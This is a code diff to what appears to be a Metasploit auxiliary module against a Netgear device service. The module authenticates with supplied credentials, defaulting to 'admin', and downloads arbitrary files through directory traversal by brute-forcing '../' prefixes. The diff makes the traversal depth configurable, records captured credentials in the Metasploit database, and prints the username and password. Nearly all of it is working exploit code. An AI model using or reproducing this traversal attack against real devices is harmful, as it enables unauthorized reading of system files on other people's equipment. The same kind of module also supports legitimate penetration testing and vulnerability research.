@@ -41,6 +41,11 @@ class Metasploit4 < Msf::Auxiliary
         OptString.new('PASSWORD', [true, 'Password for the specified username', 'admin']),
         OptString.new('FILEPATH', [false, 'Path of the file to download minus the drive letter', '/Windows/System32/calc.exe']),
       ], self.class)
+
+    register_advanced_options(
+      [
+        OptInt.new('DEPTH', [false, 'Max depth to traverse', 15])
+      ], self.class)
   end
 
   def authenticate
@@ -146,16 +151,48 @@ class Metasploit4 < Msf::Auxiliary
     print_good("File saved in: #{path}")
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: 'netgear',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
 
   def run
     cookie = authenticate
     if cookie == nil
       fail_with(Failure::Unknown, "#{peer} - Failed to log in with the provided credentials.")
     else
-      print_good("#{peer} - Logged with successfully.")
+      print_good("#{peer} - Logged in with #{datastore['USERNAME']}:#{datastore['PASSWORD']} successfully.")
+      report_cred(
+        user: datastore['USERNAME'],
+        password: datastore['PASSWORD'],
+        proof: cookie
+      )
     end
 
-    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
+    if datastore['FILEPATH'].blank?
       fail_with(Failure::Unknown, "#{peer} - Please supply the path of the file you want to download.")
       return
     end
@@ -171,7 +208,7 @@ class Metasploit4 < Msf::Auxiliary
 
     print_error("#{peer} - File not found, using bruteforce to attempt to download the file")
     count = 1
-    while count < 15
+    while count < datastore['DEPTH']
       res = download_file(("../" * count).chomp('/') + filepath, cookie)
       if res && res.code == 200
         if res.body.to_s.bytesize != 0 && (not res.body.to_s =~/This file does not exist./) && (not res.body.to_s =~/operation is failed/)
